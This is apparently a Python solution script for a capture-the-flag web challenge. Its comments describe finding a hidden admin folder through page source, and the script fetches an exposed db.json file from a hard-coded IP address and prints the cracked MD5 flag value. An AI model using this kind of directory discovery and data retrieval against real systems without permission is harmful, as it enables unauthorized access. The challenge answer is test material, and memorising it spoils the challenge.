import requests
import json
import hashlib
session=requests.Session()

url="http://34.77.37.110/encrypted-database"

def getrequest(url):
	response=session.get(url)
	content=response.text
	headers=response.headers
	return headers,content

#Step1:Checking the source code of the url above ,we find the following link
	# http://34.77.37.110/encrypted-database/secret-admin/assets/app.js
	#The folder secret-admin might be interesting


#Step2:Navigating to the directory,we find another page with a login page in it
	#Checking the source code we find another link to the hidden database in the hidden,value of the form 
	# http://34.77.37.110/encrypted-database/secret-admin/hidden-database/db.json


#Steps3: Getting the contents of the hidden-database json file

url2="http://34.77.37.110/encrypted-database/secret-admin/hidden-database/db.json"
#Getting the json
json_contents=(getrequest(url2)[1])
#Converting to an object
json_object=(json.loads(json_contents))
#Getting the hash
hashed=json_object.get('flag')
clear='badboy'
print(clear)
#The clear value of the md5 is badboy